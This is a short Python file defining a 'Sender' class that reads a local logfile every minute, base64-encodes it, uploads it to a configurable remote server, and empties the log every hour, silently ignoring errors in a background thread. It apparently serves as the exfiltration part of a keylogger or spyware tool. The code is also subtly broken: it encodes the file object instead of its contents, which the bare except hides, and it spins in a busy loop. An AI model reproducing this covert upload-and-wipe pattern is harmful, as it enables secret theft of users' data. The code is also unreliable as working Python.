import requests as r
import threading
import schedule
import base64

class Sender():
    def __init__(self, remote = "http://127.0.0.1", logfile = "./logfile"):
        self.remote = remote
        self.logfile = logfile
        self.scheduler_thread = None

    def run_scheduler(self):
        schedule.every().minute.do(self.collect)
        schedule.every().hour.do(self.clear_logs)

    def collect(self):
        try:
            with open(self.logfile, 'rb') as f:
                encoded = base64.b64encode(f) 
                resp = r.post(self.remote, files={'logfile.txt': encoded})
        except:
            pass
                
    def clear_logs(self):
        open(self.logfile, "w").close()

    def start(self):
        self.run_scheduler()
        self.scheduler_thread = threading.Thread(target=self.run_tasks)
        self.scheduler_thread.start()

    def run_tasks(self):
        while True:
            schedule.run_pending()

    def join(self):
        self.scheduler_thread.join()
        

